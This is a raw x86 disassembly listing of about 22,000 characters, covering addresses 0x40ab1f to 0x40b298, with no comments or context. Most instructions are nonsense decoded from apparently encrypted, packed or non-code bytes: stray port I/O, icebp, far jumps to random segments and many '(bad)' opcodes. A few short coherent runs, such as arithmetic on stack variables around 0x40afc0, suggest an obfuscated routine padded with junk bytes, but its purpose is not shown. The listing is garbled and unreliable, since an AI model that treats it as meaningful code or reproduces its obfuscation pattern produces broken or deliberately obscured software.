  40ab1f:	pmaddwd mm2,QWORD PTR [edx]
  40ab22:	push   ss
  40ab23:	ret    
  40ab24:	popf   
  40ab25:	aas    
  40ab26:	rol    DWORD PTR [edi+0x280a2da],1
  40ab2c:	lods   al,BYTE PTR ds:[esi]
  40ab2d:	ret    0x3995
  40ab30:	and    eax,ebp
  40ab32:	mov    bl,0x7a
  40ab34:	into   
  40ab35:	or     DWORD PTR [ebp+0xfe5f4e2],eax
  40ab3b:	mov    edx,0x7cafbebc
  40ab40:	and    eax,0xa6bc3524
  40ab45:	pushf  
  40ab46:	push   cs
  40ab47:	into   
  40ab48:	icebp  
  40ab49:	jae    0x40ab36
  40ab4b:	test   DWORD PTR [edi],0xb0a5e27c
  40ab51:	xor    DWORD PTR [ecx-0x1e],ecx
  40ab54:	pushf  
  40ab55:	call   0x7eb4:0x27d1f6d1
  40ab5c:	out    dx,eax
  40ab5d:	push   esi
  40ab5e:	in     eax,0x1
  40ab60:	jecxz  0x40abc3
  40ab62:	out    0xa3,eax
  40ab64:	adc    edx,DWORD PTR [ebp+0x6512dae6]
  40ab6a:	sub    bh,ch
  40ab6c:	push   ss
  40ab6d:	jmp    0x40ab32
  40ab6f:	jo     0x40aaf6
  40ab71:	out    dx,eax
  40ab72:	lahf   
  40ab73:	(bad)  
  40ab74:	aad    0xea
  40ab76:	mov    edx,0x9ac514d
  40ab7b:	mov    bh,0x9
  40ab7d:	dec    esp
  40ab7e:	cmp    ch,BYTE PTR [eax-0x3e]
  40ab81:	or     BYTE PTR ds:0x64ab75aa,0x9b
  40ab88:	sub    ecx,DWORD PTR [ebx]
  40ab8a:	push   0x959db25e
  40ab8f:	pop    edi
  40ab90:	mov    eax,ds:0x399c93e1
  40ab95:	enter  0x9fac,0xe0
  40ab99:	inc    eax
  40ab9a:	push   ss
  40ab9b:	mov    eax,ds:0x5f5a2189
  40aba0:	xchg   edi,eax
  40aba1:	ss leave 
  40aba3:	dec    esp
  40aba4:	sahf   
  40aba5:	push   eax
  40aba6:	pushf  
  40aba7:	pop    eax
  40aba8:	vpshaq xmm14,[ebx-0x11],xmm7
  40abae:	add    BYTE PTR [ecx],0xd1
  40abb1:	pop    edi
  40abb2:	sar    DWORD PTR cs:[ebp-0x1c],0x2c
  40abb7:	out    dx,al
  40abb8:	icebp  
  40abb9:	dec    ecx
  40abba:	cmp    ecx,DWORD PTR [edx+0x7c9039ad]
  40abc0:	test   al,0xd8
  40abc2:	dec    ebx
  40abc3:	into   
  40abc4:	inc    esi
  40abc5:	pop    esi
  40abc6:	rcl    DWORD PTR [ebp*2-0x50701054],cl
  40abcd:	pop    esp
  40abce:	dec    edx
  40abcf:	dec    ecx
  40abd0:	pshufw mm4,QWORD PTR [esi-0x50],0xba
  40abd5:	fisttp WORD PTR [eax-0x51]
  40abd8:	ret    
  40abd9:	stos   BYTE PTR es:[edi],al
  40abda:	ins    BYTE PTR es:[edi],dx
  40abdb:	jmp    0x40ab84
  40abdd:	sbb    edi,ebx
  40abdf:	getsec 
  40abe1:	pop    esp
  40abe2:	mov    ch,0x9d
  40abe4:	xchg   edi,eax
  40abe5:	jmp    0x40ab70
  40abe7:	add    al,0x3a
  40abe9:	sbb    BYTE PTR [ecx+0x30f70843],dh
  40abef:	sub    al,0x55
  40abf1:	ror    BYTE PTR [esi-0x24789676],0xbe
  40abf8:	hlt    
  40abf9:	add    dh,BYTE PTR [edi-0x438db285]
  40abff:	enter  0x1863,0xcd
  40ac03:	xor    bl,BYTE PTR [ecx]
  40ac05:	out    0xe5,eax
  40ac07:	jnp    0x40abd6
  40ac09:	cdq    
  40ac0a:	inc    edi
  40ac0b:	sbb    ebp,DWORD PTR ds:0xb6cfbc40
  40ac11:	xor    esi,ebp
  40ac13:	leave  
  40ac14:	pop    esp
  40ac15:	xchg   DWORD PTR ss:[esi-0x10],esi
  40ac19:	push   ebp
  40ac1a:	cmc    
  40ac1b:	xchg   DWORD PTR [esi],ebp
  40ac1d:	dec    esp
  40ac1e:	ret    0x7c5e
  40ac21:	sub    eax,0xd9ffa09e
  40ac26:	pop    ecx
  40ac27:	lock int 0x57
  40ac2a:	inc    edi
  40ac2b:	add    eax,0xbda799e6
  40ac30:	cmp    BYTE PTR [esp+ecx*4+0x3fcb3ff],0x23
  40ac38:	shr    BYTE PTR [esi],cl
  40ac3a:	les    ebx,FWORD PTR [edi-0x5f49657a]
  40ac40:	adc    DWORD PTR [eax+0x3f],0x3
  40ac44:	stc    
  40ac45:	add    edx,ecx
  40ac47:	imul   edx,edi
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0xd56a3c5e
  40ac5f:	and    al,0x3c
  40ac61:	in     al,0x3d
  40ac63:	cld    
  40ac64:	jl     0x40ace2
  40ac66:	retf   0x7c79
  40ac69:	jl     0x40ac4d
  40ac6b:	call   0x1a50:0xab04f592
  40ac72:	pop    edx
  40ac73:	lods   eax,DWORD PTR ds:[esi]
  40ac74:	push   es
  40ac75:	ret    0x715b
  40ac78:	rcl    DWORD PTR [edx+0x18],1
  40ac7b:	loopne 0x40aca0
  40ac7d:	sbb    eax,DWORD PTR [ebp-0x425307e7]
  40ac83:	mov    bh,0xc7
  40ac85:	push   0x81eaf474
  40ac8a:	in     eax,dx
  40ac8b:	bts    DWORD PTR [edi+0x58],edx
  40ac8f:	jbe    0x40acf6
  40ac91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac92:	int    0xe0
  40ac94:	les    ecx,FWORD PTR [edi-0x58]
  40ac97:	mov    al,ds:0x23205114
  40ac9c:	jnp    0x40acd4
  40ac9e:	popa   
  40ac9f:	pop    ecx
  40aca0:	sbb    DWORD PTR [ecx+0x658a04e9],esi
  40aca6:	xor    ebp,ebp
  40aca8:	jno    0x40ac90
  40acaa:	push   eax
  40acab:	add    al,0xb0
  40acad:	cs (bad) 
  40acaf:	ins    DWORD PTR es:[edi],dx
  40acb0:	fst    QWORD PTR [edx-0x2b]
  40acb3:	push   esp
  40acb4:	pushf  
  40acb5:	ja     0x40ad10
  40acb7:	shl    cl,1
  40acb9:	imul   edx,ebx,0x48
  40acbc:	int    0xbc
  40acbe:	or     BYTE PTR [esi],cl
  40acc0:	(bad)  
  40acc1:	fisttp WORD PTR [esp+eax*1+0x33aef904]
  40acc8:	or     eax,DWORD PTR [ebp+ecx*4+0x7b]
  40accc:	loope  0x40acee
  40acce:	jne    0x40ac58
  40acd0:	adc    al,0x5
  40acd2:	mov    eax,0x60a2a1e3
  40acd7:	pushf  
  40acd8:	xchg   edx,eax
  40acd9:	int3   
  40acda:	repnz and eax,0xedb3ce97
  40ace0:	sti    
  40ace1:	dec    esp
  40ace2:	stos   DWORD PTR es:[edi],eax
  40ace3:	imul   eax,esi,0x98c4c463
  40ace9:	or     cl,cl
  40aceb:	mov    bh,0x28
  40aced:	push   ebp
  40acee:	sbb    eax,0xfd817bd5
  40acf3:	and    ecx,DWORD PTR es:[ecx+0x34]
  40acf7:	loope  0x40acce
  40acf9:	jp     0x40ad13
  40acfb:	sti    
  40acfc:	push   edi
  40acfd:	in     eax,0x32
  40acff:	fucomi st,st(0)
  40ad01:	sub    edi,edx
  40ad03:	(bad)  
  40ad05:	add    ah,BYTE PTR [eax-0x12e7c700]
  40ad0b:	out    0x58,al
  40ad0d:	adc    BYTE PTR ds:0x9e31179e,bl
  40ad13:	or     ebp,DWORD PTR [edx+0x3e63024d]
  40ad19:	in     al,0x84
  40ad1b:	repnz adc DWORD PTR [edi],esi
  40ad1e:	repnz loopne 0x40acda
  40ad21:	sti    
  40ad22:	es push esp
  40ad24:	sub    BYTE PTR [esi-0x67],ch
  40ad27:	inc    ebp
  40ad28:	push   ss
  40ad29:	xchg   dh,bh
  40ad2b:	push   0x78b75772
  40ad30:	(bad)  
  40ad31:	add    DWORD PTR [ebp+0x6d9b6ef3],0x9
  40ad38:	retf   0x8a88
  40ad3b:	call   0xb8cd:0xcc1ecccf
  40ad42:	dec    edi
  40ad43:	loopne 0x40ad06
  40ad45:	or     DWORD PTR [edi-0x5b232cea],ebx
  40ad4b:	or     bl,BYTE PTR [esp+edi*1+0x3c]
  40ad4f:	ret    0xc5fa
  40ad52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad53:	jno    0x40ad49
  40ad55:	aaa    
  40ad56:	add    BYTE PTR [edi-0x5b7788f3],cl
  40ad5c:	in     al,dx
  40ad5d:	das    
  40ad5e:	scas   al,BYTE PTR es:[edi]
  40ad5f:	jecxz  0x40acee
  40ad61:	push   0x4e
  40ad63:	jmp    0x40acff
  40ad65:	pushf  
  40ad66:	ja     0x40ad9a
  40ad68:	enter  0x94ee,0x7
  40ad6c:	es mov ch,0xf5
  40ad6f:	add    esi,DWORD PTR [ebx-0x15]
  40ad72:	cld    
  40ad73:	xor    ebx,edx
  40ad75:	pop    esp
  40ad76:	cli    
  40ad77:	add    al,0x26
  40ad79:	ins    BYTE PTR es:[edi],dx
  40ad7a:	loopne 0x40ad64
  40ad7c:	in     eax,0x3a
  40ad7e:	lea    esp,[edx-0x40]
  40ad81:	icebp  
  40ad82:	dec    ebp
  40ad83:	arpl   WORD PTR [ecx-0x56],di
  40ad86:	lods   al,BYTE PTR ds:[esi]
  40ad87:	scas   eax,DWORD PTR es:[edi]
  40ad88:	stos   BYTE PTR es:[edi],al
  40ad89:	scas   ax,WORD PTR es:[edi]
  40ad8b:	adc    DWORD PTR [ecx],esp
  40ad8d:	sbb    BYTE PTR [esi+0x297396b5],dl
  40ad93:	fsubr  DWORD PTR [ebx+0x5]
  40ad96:	fs retf 0xf463
  40ad9a:	sub    al,0x83
  40ad9c:	loope  0x40ae19
  40ad9e:	adc    eax,0x9391ecf
  40ada3:	jle    0x40adaf
  40ada5:	popa   
  40ada6:	xor    al,0x70
  40ada8:	pop    ecx
  40ada9:	ja     0x40ad7e
  40adab:	imul   ebp,DWORD PTR [ebx],0xffffffde
  40adae:	push   edi
  40adaf:	mov    BYTE PTR [ebx+esi*1],dh
  40adb2:	enter  0x7a9c,0xc7
  40adb6:	(bad)  
  40adb7:	pop    edx
  40adb8:	add    ah,bl
  40adba:	mov    DWORD PTR [esi+0x77c79c45],esp
  40adc0:	fcomp  QWORD PTR [edi+0x261fb4a8]
  40adc6:	clc    
  40adc7:	push   edi
  40adc8:	push   ecx
  40adc9:	std    
  40adca:	xchg   ecx,eax
  40adcb:	(bad)  
  40adcc:	adc    esi,edi
  40adce:	sahf   
  40adcf:	add    BYTE PTR [eax],ah
  40add1:	fucom  st(4)
  40add3:	in     eax,dx
  40add4:	or     BYTE PTR [esp+esi*4+0x78],dl
  40add8:	push   esp
  40add9:	mov    dl,0xc4
  40addb:	push   es
  40addc:	and    BYTE PTR [esi-0x42],dh
  40addf:	mov    esi,edx
  40ade1:	mov    ds:0xe1c124d8,eax
  40ade6:	pop    es
  40ade7:	iret   
  40ade8:	dec    ebp
  40ade9:	xor    esi,DWORD PTR [eax+0x4d]
  40adec:	pushf  
  40aded:	xor    DWORD PTR [ebp-0x50e2a34c],ebp
  40adf3:	retf   0x65f7
  40adf6:	mov    ebp,0xf176865c
  40adfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adfc:	cmp    ebx,DWORD PTR [eax+0x1f0c54d3]
  40ae02:	add    eax,0xf52f0a73
  40ae07:	push   ds
  40ae08:	mov    cl,0x52
  40ae0a:	dec    esp
  40ae0b:	xchg   ebp,eax
  40ae0c:	mov    ch,0x1a
  40ae0e:	xor    eax,0x6696c67f
  40ae13:	or     al,0x67
  40ae15:	and    al,0x3a
  40ae17:	fiadd  DWORD PTR [edx+0x5d]
  40ae1a:	xor    BYTE PTR [edi+0x12],bh
  40ae1d:	jmp    0x40ae58
  40ae1f:	and    ebp,ecx
  40ae21:	sub    edi,esp
  40ae23:	pop    ds
  40ae24:	loopne 0x40add3
  40ae26:	cmovg  eax,DWORD PTR [esp+edi*1+0x5e0402bd]
  40ae2e:	inc    esi
  40ae2f:	jb     0x40ae8a
  40ae31:	fbstp  TBYTE PTR [ebx+0x53]
  40ae34:	lods   al,BYTE PTR ds:[esi]
  40ae35:	xchg   esp,eax
  40ae36:	jmp    0x8056:0xa813bb0a
  40ae3d:	jmp    0xa55:0xe8f8fc7e
  40ae44:	shl    ch,0x2d
  40ae47:	inc    esp
  40ae48:	mov    ah,BYTE PTR [ebx-0x74280799]
  40ae4e:	jb     0x40ae1d
  40ae50:	stos   BYTE PTR es:[edi],al
  40ae51:	sbb    BYTE PTR [ebx+0x7951a275],0x56
  40ae58:	push   0x4460f391
  40ae5d:	out    dx,al
  40ae5e:	int    0x47
  40ae60:	out    0x79,al
  40ae62:	lahf   
  40ae63:	aad    0xc3
  40ae65:	push   esi
  40ae66:	or     edi,esi
  40ae68:	push   es
  40ae69:	rcl    BYTE PTR [ecx],0x34
  40ae6c:	iret   
  40ae6d:	cdq    
  40ae6e:	and    al,BYTE PTR [ebx+eiz*4]
  40ae71:	mov    esp,0xb0a429af
  40ae76:	ss dec edi
  40ae78:	sbb    DWORD PTR [esi-0x2560a3e7],ecx
  40ae7e:	sub    ah,BYTE PTR [edx+0x2e68179f]
  40ae84:	repnz retf 
  40ae86:	cli    
  40ae87:	pop    ds
  40ae88:	dec    edi
  40ae89:	push   edi
  40ae8a:	aas    
  40ae8b:	push   esi
  40ae8c:	pop    ds
  40ae8d:	mov    bl,0xdf
  40ae8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae90:	mov    ebp,0x6f47e161
  40ae95:	jge    0x40ae65
  40ae97:	or     edx,0x960d586a
  40ae9d:	add    al,0xc3
  40ae9f:	call   0x672a:0xddb02ddc
  40aea6:	mov    cl,BYTE PTR [ecx]
  40aea8:	jno    0x40ae89
  40aeaa:	adc    dl,dh
  40aeac:	stc    
  40aead:	icebp  
  40aeae:	(bad)
  40aeb2:	pop    ebp
  40aeb3:	xchg   esp,eax
  40aeb4:	out    dx,al
  40aeb5:	hlt    
  40aeb6:	xchg   ebx,eax
  40aeb7:	sbb    edi,ebx
  40aeb9:	std    
  40aeba:	fld    TBYTE PTR [esi+ecx*8]
  40aebd:	bound  edx,QWORD PTR [esi]
  40aebf:	cmp    al,0xcd
  40aec1:	cmp    eax,0x1fcb16e5
  40aec6:	repnz rcl DWORD PTR [esi+0xd233a98],0xaf
  40aece:	ret    
  40aecf:	inc    ecx
  40aed0:	icebp  
  40aed1:	fcmovnbe st,st(4)
  40aed3:	sahf   
  40aed4:	das    
  40aed5:	cmp    eax,0xc10fbb30
  40aeda:	pop    es
  40aedb:	push   es
  40aedc:	add    dh,bh
  40aede:	js     0x40af17
  40aee0:	push   edi
  40aee1:	scas   eax,DWORD PTR es:[edi]
  40aee2:	out    dx,al
  40aee3:	dec    ebp
  40aee4:	ret    
  40aee5:	ja     0x40af58
  40aee7:	sub    al,0x52
  40aee9:	dec    esp
  40aeea:	aas    
  40aeeb:	not    BYTE PTR [ebp+0x17]
  40aeee:	out    dx,al
  40aeef:	out    dx,eax
  40aef0:	inc    ebx
  40aef1:	cmc    
  40aef2:	mov    bl,0x7c
  40aef4:	pusha  
  40aef5:	ror    BYTE PTR [ebx-0x7b6f9857],0xa
  40aefc:	outs   dx,DWORD PTR ds:[esi]
  40aefd:	retf   0xc9cd
  40af00:	loope  0x40af3f
  40af02:	je     0x40aec0
  40af04:	les    ebx,FWORD PTR [ebp+0x38e27d06]
  40af0a:	lahf   
  40af0b:	(bad)  
  40af0d:	or     eax,0x315c5a12
  40af12:	xchg   ecx,eax
  40af13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af14:	leave  
  40af15:	pop    esi
  40af16:	xchg   esp,eax
  40af17:	push   ax
  40af19:	cmp    DWORD PTR [ecx+0x20],edx
  40af1c:	pop    ecx
  40af1d:	dec    edx
  40af1e:	dec    edi
  40af1f:	jmp    0x9a28a0ca
  40af24:	lds    edi,FWORD PTR [ecx-0x11]
  40af27:	imul   esi,ecx,0x2f
  40af2a:	cmp    BYTE PTR [ebp-0x1d8fba0],cl
  40af30:	std    
  40af31:	mov    WORD PTR [edi],es
  40af33:	mov    ebp,0x542fa1e1
  40af38:	fld    TBYTE PTR [eax]
  40af3a:	cld    
  40af3b:	enter  0xcca,0x73
  40af3f:	sub    DWORD PTR [ebp-0x610a0fc3],edx
  40af45:	jge    0x40afc6
  40af47:	sbb    edx,esi
  40af49:	jge    0x40aefc
  40af4b:	outs   dx,DWORD PTR ds:[esi]
  40af4c:	dec    eax
  40af4d:	in     al,dx
  40af4e:	pusha  
  40af4f:	jl     0x40aeeb
  40af51:	ret    
  40af52:	mov    ch,0xbd
  40af54:	cmp    ebp,DWORD PTR [eax]
  40af56:	or     ch,BYTE PTR [eax-0x5b362808]
  40af5c:	mov    eax,ds:0xcfecbf9e
  40af61:	inc    edi
  40af62:	sub    eax,0x331ec231
  40af67:	scas   eax,DWORD PTR es:[edi]
  40af68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af69:	lahf   
  40af6a:	xchg   BYTE PTR [ecx-0x6601acd5],bh
  40af70:	pop    edi
  40af71:	test   BYTE PTR [ebx],cl
  40af73:	addr16 int3 
  40af75:	sub    eax,0x1e86ce0c
  40af7a:	dec    edx
  40af7b:	and    bl,BYTE PTR ds:0xb39c28ba
  40af81:	je     0x40afea
  40af83:	sbb    ah,BYTE PTR [esi]
  40af85:	lea    ebp,[edi]
  40af87:	sti    
  40af88:	xor    edi,DWORD PTR [esi+edi*4-0x3a]
  40af8c:	add    DWORD PTR ds:0x6d442b09,edi
  40af92:	push   esi
  40af93:	cmc    
  40af94:	leave  
  40af95:	loopne 0x40afb6
  40af97:	retf   
  40af98:	push   es
  40af99:	addr16 inc esp
  40af9b:	aas    
  40af9c:	sub    DWORD PTR [ebx+ebp*8+0x7bcb8b9d],edi
  40afa3:	and    bh,BYTE PTR [ecx+0x65abf2b]
  40afa9:	add    ecx,edx
  40afab:	mov    eax,ds:0x195ffe76
  40afb0:	pop    eax
  40afb1:	jne    0x40b017
  40afb3:	xchg   DWORD PTR [edi],esi
  40afb5:	in     al,0x9
  40afb7:	cmp    BYTE PTR [ebx-0x60fd1c25],0x54
  40afbe:	pop    ecx
  40afbf:	(bad)  
  40afc0:	mov    ebx,DWORD PTR [ebp-0x10]
  40afc3:	sub    ebx,edi
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fcom   st(2)
  40b000:	xchg   esi,eax
  40b001:	es push ebp
  40b003:	mov    edi,ecx
  40b005:	jl     0x40b083
  40b007:	retf   0x7c79
  40b00a:	jl     0x40afce
  40b00c:	or     esi,DWORD PTR [ecx-0x2b2c966d]
  40b012:	daa    
  40b013:	dec    esi
  40b014:	vmwrite edx,DWORD PTR [ebp-0x1f]
  40b018:	push   ebx
  40b019:	outs   dx,DWORD PTR ds:[esi]
  40b01a:	test   al,0xe7
  40b01c:	popw   ds
  40b01e:	test   eax,0xee8edebb
  40b023:	outs   dx,BYTE PTR ds:[esi]
  40b024:	add    eax,0xa044f9f9
  40b029:	jmp    0x1a20:0xd0657b07
  40b030:	cmp    ebx,edi
  40b032:	fbstp  TBYTE PTR [edx-0x3621f487]
  40b038:	rol    DWORD PTR [esi],1
  40b03a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b03b:	jg     0x40b08e
  40b03d:	mov    bh,0xec
  40b03f:	out    0xf9,eax
  40b041:	mov    bh,0xce
  40b043:	sub    BYTE PTR [ebp+0x4efce041],bl
  40b049:	push   eax
  40b04a:	fmul   st,st(4)
  40b04c:	mov    dh,0x13
  40b04e:	gs icebp 
  40b050:	rol    BYTE PTR [edi-0x3d204fc8],cl
  40b056:	loopne 0x40b00c
  40b058:	mov    eax,ds:0xbf202ccb
  40b05d:	mov    edi,DWORD PTR [ebx]
  40b05f:	hlt    
  40b060:	and    BYTE PTR [edi],dl
  40b062:	popa   
  40b063:	jo     0x40b03e
  40b065:	mov    ebp,0xe7a37097
  40b06a:	xchg   edx,eax
  40b06b:	jno    0x40b08d
  40b06d:	inc    eax
  40b06e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b06f:	dec    esp
  40b070:	or     ebp,DWORD PTR [edi-0x4f]
  40b073:	loopne 0x40b039
  40b075:	jg     0x40b023
  40b077:	outs   dx,DWORD PTR ds:[esi]
  40b078:	jb     0x40b0cd
  40b07a:	push   esp
  40b07b:	cmp    eax,0x17068197
  40b080:	iret   
  40b081:	mov    edi,0xba49d069
  40b086:	mov    al,ds:0x28dac33e
  40b08b:	mov    ds:0x22039c51,al
  40b090:	ret    
  40b091:	repz cli 
  40b093:	xor    al,0xa4
  40b095:	fdiv   st(7),st
  40b097:	mov    ds:0xbf5436ab,al
  40b09c:	add    ch,BYTE PTR [esp+ebp*4+0x139f97fb]
  40b0a3:	in     eax,0xcc
  40b0a5:	pop    ebx
  40b0a6:	loope  0x40b091
  40b0a8:	ins    BYTE PTR es:[edi],dx
  40b0a9:	pop    esi
  40b0aa:	adc    eax,0xd2c4db3f
  40b0af:	fwait
  40b0b0:	mov    eax,ds:0x9daa714e
  40b0b5:	inc    ebp
  40b0b6:	mov    eax,ds:0xf8c0450a
  40b0bb:	push   ss
  40b0bc:	scas   eax,DWORD PTR es:[edi]
  40b0bd:	arpl   WORD PTR [eax],bx
  40b0bf:	or     cl,ah
  40b0c1:	inc    edx
  40b0c2:	(bad)  
  40b0c4:	or     BYTE PTR [edi-0xa],ch
  40b0c7:	jecxz  0x40b0c0
  40b0c9:	test   BYTE PTR [eax-0x38],0x91
  40b0cd:	jnp    0x40b0a9
  40b0cf:	lods   eax,DWORD PTR ds:[esi]
  40b0d0:	(bad)  
  40b0d2:	add    eax,0xfdc60a5b
  40b0d7:	xor    bl,BYTE PTR [edi+0x1b8f2f79]
  40b0dd:	jae    0x40b0c2
  40b0df:	cmp    BYTE PTR [ebx-0x7d],bl
  40b0e2:	mov    edi,0x8c2720b5
  40b0e7:	data16 fld DWORD PTR [edi+0x7f]
  40b0eb:	jmp    0xdca02eee
  40b0f0:	add    eax,0x7c2ceb6e
  40b0f5:	ret    
  40b0f6:	sar    DWORD PTR [eax+0x74e2de6],0xc7
  40b0fd:	sbb    eax,0xd425e534
  40b102:	shr    BYTE PTR [ebp-0x5130232c],1
  40b108:	idiv   DWORD PTR [eax]
  40b10a:	and    BYTE PTR [ecx+0x6d38ea33],0xe0
  40b111:	jne    0x40b0bd
  40b113:	xchg   ecx,eax
  40b114:	dec    edx
  40b115:	cmp    ebx,DWORD PTR [edi+0x58870aa6]
  40b11b:	add    al,0xdf
  40b11d:	sbb    BYTE PTR [ebx],dh
  40b11f:	add    DWORD PTR [edi-0x753b8917],ecx
  40b125:	xchg   BYTE PTR [ebx-0x280f384a],cl
  40b12b:	test   eax,0xb3eae2c
  40b130:	fwait
  40b131:	xchg   DWORD PTR [eax+0x1ccc6b11],ebx
  40b137:	je     0x40b0c0
  40b139:	lds    ebx,FWORD PTR [edx-0x4ef97003]
  40b13f:	and    eax,0x742a24e9
  40b144:	sbb    ch,dl
  40b146:	das    
  40b147:	retf   
  40b148:	xchg   esp,eax
  40b149:	sub    BYTE PTR [ebx],al
  40b14b:	leave  
  40b14c:	mov    dl,0x6d
  40b14e:	xor    eax,0x773dd120
  40b153:	jecxz  0x40b1b0
  40b155:	jns    0x40b110
  40b157:	cmp    edx,ecx
  40b159:	jno    0x40b1ae
  40b15b:	jns    0x40b0eb
  40b15d:	xchg   DWORD PTR [eax-0x5d653b59],esi
  40b163:	jg     0x40b1b7
  40b165:	sahf   
  40b166:	nop
  40b167:	(bad)  
  40b168:	xor    al,bl
  40b16a:	lods   eax,DWORD PTR ds:[esi]
  40b16b:	call   0xfb789ffd
  40b170:	cmc    
  40b171:	cli    
  40b172:	jae    0x40b10b
  40b174:	and    ecx,0xafd6c7f9
  40b17a:	push   ecx
  40b17b:	minps  xmm0,XMMWORD PTR [eax-0xf]
  40b17f:	outs   dx,BYTE PTR ds:[esi]
  40b180:	sub    al,0x4d
  40b182:	lock inc eax
  40b184:	icebp  
  40b185:	jbe    0x40b1cc
  40b187:	and    BYTE PTR [ebp+ebx*1+0x7],bl
  40b18b:	push   es
  40b18c:	(bad)  
  40b18d:	repz pop esi
  40b18f:	sti    
  40b190:	dec    esp
  40b191:	aad    0xe4
  40b193:	js     0x40b160
  40b195:	inc    edx
  40b196:	sub    ebx,DWORD PTR [esi]
  40b198:	(bad)  
  40b199:	outs   dx,DWORD PTR ds:[esi]
  40b19b:	dec    esi
  40b19c:	pop    eax
  40b19d:	xor    eax,0xfe13000a
  40b1a2:	(bad)  
  40b1a3:	xchg   BYTE PTR [eax-0x1edbde3f],dl
  40b1a9:	scas   al,BYTE PTR es:[edi]
  40b1aa:	repnz bound esp,QWORD PTR [esp+ebp*2]
  40b1ae:	mov    ebp,ebx
  40b1b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1b1:	(bad)  
  40b1b2:	mov    ds:0xa1cbc96b,al
  40b1b7:	daa    
  40b1b8:	dec    eax
  40b1b9:	push   ebx
  40b1ba:	cmp    al,0xdf
  40b1bc:	xor    eax,0x9c251f54
  40b1c1:	stc    
  40b1c2:	iret   
  40b1c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1c4:	dec    ecx
  40b1c5:	cdq    
  40b1c6:	pushf  
  40b1c7:	dec    ecx
  40b1c8:	xor    dh,BYTE PTR [ebx]
  40b1ca:	mov    dh,BYTE PTR [ebx+edi*2-0x431fbced]
  40b1d1:	add    bh,BYTE PTR [edi-0x622f4be0]
  40b1d7:	pop    ecx
  40b1d8:	cli    
  40b1d9:	mov    edx,0xfbfed5bf
  40b1de:	je     0x40b24a
  40b1e0:	push   edi
  40b1e1:	popf   
  40b1e2:	sub    edx,DWORD PTR [esi-0x7b8c9dd6]
  40b1e8:	xlat   BYTE PTR ds:[ebx]
  40b1e9:	pop    ebx
  40b1ea:	mov    ebx,0x3b476084
  40b1ef:	sbb    cl,BYTE PTR [ecx-0x71]
  40b1f2:	fs push edi
  40b1f4:	imul   ebx,edi,0x4feaba61
  40b1fa:	test   BYTE PTR [edx-0x49],cl
  40b1fd:	pop    ss
  40b1fe:	ins    BYTE PTR es:[edi],dx
  40b1ff:	inc    esi
  40b200:	push   esi
  40b201:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b203:	sar    DWORD PTR [ecx],0xc2
  40b206:	lea    edx,[edi]
  40b208:	stos   BYTE PTR es:[edi],al
  40b209:	call   0x6592:0x6aec20f3
  40b210:	ss push edi
  40b212:	repz dec esi
  40b214:	xchg   ecx,eax
  40b215:	cli    
  40b216:	push   es
  40b217:	and    al,BYTE PTR [ebx]
  40b219:	jg     0x40b1fa
  40b21b:	mov    cl,0x2a
  40b21d:	int    0x82
  40b21f:	adc    al,0x7f
  40b221:	out    dx,eax
  40b222:	push   ebp
  40b223:	xor    DWORD PTR [ecx-0x12],ecx
  40b226:	int    0x77
  40b228:	test   BYTE PTR [eax-0x19],cl
  40b22b:	bound  edi,QWORD PTR [esi+0x32d97c83]
  40b231:	aad    0x1e
  40b233:	push   0x41
  40b235:	jp     0x40b265
  40b237:	xchg   DWORD PTR [esi+0x1ea8c9d4],edx
  40b23d:	repnz imul ebx,DWORD PTR [eax-0x5e19c8ec],0xfffffff5
  40b245:	adc    al,0x8f
  40b247:	ss loope 0x40b1fd
  40b24a:	pop    ebp
  40b24b:	jmp    0xc040:0xa253f643
  40b252:	pop    ebx
  40b253:	in     al,0x4e
  40b255:	call   0xa970c107
  40b25a:	jg     0x40b231
  40b25c:	loope  0x40b29d
  40b25e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b25f:	pusha  
  40b260:	sbb    BYTE PTR ds:0x60568aea,dl
  40b266:	cld    
  40b267:	aaa    
  40b268:	xor    BYTE PTR [ecx],ah
  40b26a:	push   esi
  40b26b:	in     eax,dx
  40b26c:	inc    eax
  40b26d:	push   esp
  40b26e:	ss aam 0x52
  40b271:	inc    esp
  40b272:	or     eax,0xb2fcd61e
  40b277:	retf   0x2900
  40b27a:	sti    
  40b27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b27c:	loopne 0x40b290
  40b27e:	adc    DWORD PTR [ebx],ebp
  40b280:	jns    0x40b2ed
  40b282:	out    dx,eax
  40b283:	jecxz  0x40b303
  40b285:	pop    ecx
  40b286:	or     DWORD PTR [edi],esp
  40b288:	lods   al,BYTE PTR ds:[esi]
  40b289:	ds mov edx,0x20aea72f
  40b28f:	dec    ebp
  40b290:	in     eax,0x79
  40b292:	ins    DWORD PTR es:[edi],dx
  40b293:	jl     0x40b258
  40b295:	fucomip st,st(4)
  40b297:	xchg   edi,eax
  40b298:	jl     0x40b275
